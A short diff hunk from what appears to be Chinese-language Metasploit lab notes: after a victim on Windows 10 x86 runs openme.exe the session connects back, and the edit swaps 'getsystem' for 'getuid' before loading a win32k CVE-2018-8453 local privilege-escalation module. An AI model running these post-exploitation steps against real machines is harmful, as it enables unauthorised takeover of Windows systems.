@@ -34,7 +34,7 @@ run
 之后 win10 x86 运行 openme.exe  就可以自动连上 
 
 
-getsystem
+getuid
 background
 
 use exploit/windows/local/cve_2018_8453_win32k_priv_esc 
